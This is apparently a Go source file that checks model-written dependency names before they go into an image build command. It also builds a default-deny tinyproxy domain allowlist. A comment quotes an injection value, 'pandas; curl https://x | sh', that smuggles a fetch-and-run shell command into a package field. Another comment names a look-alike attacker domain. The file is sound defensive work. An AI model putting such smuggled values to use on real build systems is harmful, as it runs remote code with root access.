package imagespec

import (
	"errors"
	"fmt"
	"regexp"
	"strings"

	"github.com/skael-dev/skael/internal/eval/spec"
)

// ErrUnsafeDep is returned for a dependency string that could not be safely
// placed in a RUN instruction.
var ErrUnsafeDep = errors.New("imagespec: unsafe dependency")

// depPattern is what an ordinary package name looks like across apt, pip and
// npm: a name, optionally scoped or versioned. Everything a shell would treat
// as syntax is outside it, and a leading dash is too — a dep is not a place to
// pass "--index-url".
var depPattern = regexp.MustCompile(`^@?[A-Za-z0-9][A-Za-z0-9._+/-]*(?:(?:==|@|=)[A-Za-z0-9][A-Za-z0-9._+-]*)?$`)

// ValidateDeps checks every declared dependency. These strings come from a
// model-authored spec and are interpolated into an image build's RUN
// instruction, which makes this a security boundary rather than a tidiness
// check: "pandas; curl https://x | sh" would otherwise execute at build time,
// as root, with the network on.
func ValidateDeps(d spec.DepsDecl) error {
	for _, group := range []struct {
		name string
		vals []string
	}{{"apt", d.Apt}, {"pip", d.Pip}, {"npm", d.Npm}} {
		for _, v := range group.vals {
			if v == "" {
				return fmt.Errorf("%w: empty %s dependency", ErrUnsafeDep, group.name)
			}
			if strings.Contains(v, "..") {
				return fmt.Errorf("%w: %s dependency %q contains a path traversal", ErrUnsafeDep, group.name, v)
			}
			if !depPattern.MatchString(v) {
				return fmt.Errorf("%w: %s dependency %q is not a plain package name", ErrUnsafeDep, group.name, v)
			}
		}
	}
	return nil
}

// domainPattern is a hostname, optionally with a leading dot for a subdomain
// wildcard. The allowlist is the enforcement point for network policy, so a
// value that could carry proxy-configuration syntax is rejected rather than
// escaped.
var domainPattern = regexp.MustCompile(`^\.?[A-Za-z0-9]([A-Za-z0-9-]*[A-Za-z0-9])?(\.[A-Za-z0-9]([A-Za-z0-9-]*[A-Za-z0-9])?)+$`)

// ProxyConfig renders the allowlist proxy's configuration and filter file,
// concatenated with the filter after a "#--- filter ---" marker so a driver can
// split them. Default-deny: a domain absent from the list is refused.
func ProxyConfig(allow []string) (string, error) {
	if len(allow) == 0 {
		return "", errors.New("imagespec: an allowlist proxy needs at least one domain")
	}
	for _, d := range allow {
		if !domainPattern.MatchString(d) {
			return "", fmt.Errorf("imagespec: %q is not a hostname", d)
		}
	}

	conf, err := baseFS.ReadFile("base/tinyproxy.conf.tmpl")
	if err != nil {
		panic(fmt.Sprintf("imagespec: %v", err))
	}

	var b strings.Builder
	b.Write(conf)
	b.WriteString("\n" + FilterMarker + "\n")
	for _, d := range sorted(allow) {
		// tinyproxy's filter is a regexp list; anchor each entry so
		// "api.anthropic.com" does not also permit "api.anthropic.com.evil.example",
		// and escape it with QuoteMeta so its literal dots stay literal dots
		// rather than becoming "any character" — an unescaped entry would also
		// let through a look-alike like "api-anthropic.com", which defeats a
		// proxy whose entire job is to be default-deny.
		fmt.Fprintf(&b, "(^|\\.)%s$\n", regexp.QuoteMeta(strings.TrimPrefix(d, ".")))
	}
	return b.String(), nil
}

// FilterMarker separates the proxy configuration from its filter file in
// ProxyConfig's output.
const FilterMarker = "#--- filter ---"
